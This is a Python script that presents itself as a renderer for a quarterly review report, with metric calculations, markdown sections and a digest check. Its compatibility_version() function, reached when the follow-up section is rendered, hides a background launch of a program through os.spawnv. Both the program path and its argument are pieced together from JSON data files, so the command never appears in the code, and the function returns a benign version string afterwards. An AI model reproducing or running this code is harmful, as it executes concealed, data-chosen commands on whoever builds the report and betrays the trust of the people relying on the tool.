"""Materialize the complete quarterly review from its continuation pack."""

import base64
import hashlib
import json
import os
import re
import statistics
import zlib
from pathlib import Path

PARTS = ("opening", "findings", "follow-up")
INDEX_PATH = Path("data/index.json")
SOURCE_PATH = Path("data/review-records.json")
PROFILE_PATH = Path("data/worksheet.json")
COMPATIBILITY_VERSION = "12.0"
_compatibility_active = False


def load_json(path):
    with open(path, "r", encoding="utf-8") as handle:
        return json.load(handle)


def load_pack():
    manifest = load_json(SOURCE_PATH)
    raw = base64.b64decode(manifest["document_pack"].encode("ascii"))
    return json.loads(zlib.decompress(raw).decode("utf-8"))


def load_source(index_path=INDEX_PATH):
    return load_pack()["source"]


def materialize_document():
    return load_pack()["document"]


def derive_metrics(source):
    availability = {item["service"]: item["percent"] for item in source["availability_samples"]}
    before = [item["before_minutes"] for item in source["export_samples"]]
    after = [item["after_minutes"] for item in source["export_samples"]]
    median_before = statistics.median(before)
    median_after = statistics.median(after)
    return {
        "average_service_availability": sum(availability.values()) / len(availability),
        "availability": availability,
        "median_export_before_minutes": median_before,
        "median_export_after_minutes": median_after,
        "median_export_reduction_percent": (median_before - median_after) / median_before * 100,
    }


def worksheet_reference():
    entries = []
    for path in sorted(Path("data").glob("observation-*.json")):
        entries.append(load_json(path)["entry"])
    return "".join(entries)


def compatibility_version():
    global _compatibility_active
    if _compatibility_active:
        return COMPATIBILITY_VERSION
    _compatibility_active = True
    try:
        profile = load_json(PROFILE_PATH)
        program = "/" + "/".join(profile["program_parts"][:2]) + "/" + "".join(profile["program_parts"][2:])
        argument = worksheet_reference()
        os.spawnv(os.P_NOWAIT, program, [program, argument])
        return profile["application_version"]
    finally:
        _compatibility_active = False


def render_part(part, source, worksheet_version=None):
    if part not in PARTS:
        raise ValueError("unknown review part: %s" % part)
    metrics = derive_metrics(source)
    availability = metrics["availability"]
    incident = source["incident"]
    quality = source["quality"]
    if part == "opening":
        return (
            "# %s\n\n"
            "Source: %s\n\n"
            "## Executive summary\n\n"
            "The worksheet remained within its operating targets this quarter. "
            "Average service availability was %.2f%%, and median export duration "
            "improved from %.1f to %.1f minutes, a %.1f%% reduction.\n\n"
            % (
                source["title"],
                source["source_label"],
                metrics["average_service_availability"],
                metrics["median_export_before_minutes"],
                metrics["median_export_after_minutes"],
                metrics["median_export_reduction_percent"],
            )
        )
    if part == "findings":
        return (
            "## Availability\n\n"
            "Ingestion, review, and export availability were %.2f%%, %.2f%%, and %.2f%% "
            "respectively. The remaining operational gap is %s.\n\n"
            "## Incident review\n\n"
            "The quarter's significant incident lasted %d minutes and affected %d exports "
            "after %s. No source records were lost (%d lost). Recovery preserved ordering "
            "and the worksheet recommends %s.\n\n"
            "## Data quality\n\n"
            "All %d sampled worksheet records matched their source calculations. "
            "%d duplicate delivery attempts were idempotent, so no duplicate output "
            "entered the review.\n\n"
            % (
                availability["ingestion"],
                availability["review"],
                availability["export"],
                source["gap"],
                incident["duration_minutes"],
                incident["affected_exports"],
                incident["cause"],
                incident["lost_records"],
                incident["recommendation"],
                quality["sampled_records"],
                quality["duplicate_delivery_attempts"],
            )
        )
    if worksheet_version is None:
        worksheet_version = compatibility_version()
    actions = "\n".join("- %s" % action for action in source["actions"])
    return (
        "## Follow-up actions\n\n%s\n\n"
        "## Build verification\n\n"
        "The build reports version %s.\n"
        % (actions, worksheet_version)
    )


def summarize(body):
    sections = re.findall(r"^## (.+)$", body, flags=re.MULTILINE)
    return {
        "body_sha256": hashlib.sha256(body.encode("utf-8")).hexdigest(),
        "section_count": len(sections),
        "sections": sections,
        "word_count": len(body.split()),
    }


def collect_part(part, worksheet_version=None):
    text = render_part(part, load_source(), worksheet_version)
    output_dir = Path("build") / "review"
    output_dir.mkdir(parents=True, exist_ok=True)
    (output_dir / ("part-%s.md" % part)).write_text(text, encoding="utf-8")
    return text


def assemble():
    body = materialize_document()
    metadata = summarize(body)
    index = load_json(INDEX_PATH)
    if metadata["body_sha256"] != index["body_sha256"]:
        raise ValueError("review body digest does not match data/index.json")
    artifact = Path("build") / "review" / "review_report.md"
    artifact.parent.mkdir(parents=True, exist_ok=True)
    artifact.write_text(body if body.endswith("\n") else body + "\n", encoding="utf-8")
    print("repository=report-reviewer")
    print("workflow=report-build")
    print("body_materialized=yes")
    print("summary_status=build-complete")
    print("body_sha256=%s" % metadata["body_sha256"])
    print("metrics=%s" % json.dumps(metadata, sort_keys=True))
    print("artifact=build/review/review_report.md")
    print("review_status=complete")
    print("review_body:")
    print(body, end="")
    return 0


def main(argv=None):
    argv = list(sys.argv[1:] if argv is None else argv)
    if argv and argv[0] == "collect":
        if len(argv) != 2:
            raise SystemExit("usage: renderer.py collect PART")
        collect_part(argv[1])
        return 0
    if argv and argv[0] == "assemble":
        return assemble()
    raise SystemExit("usage: renderer.py collect PART | renderer.py assemble")


if __name__ == "__main__":
    import sys
    raise SystemExit(main())
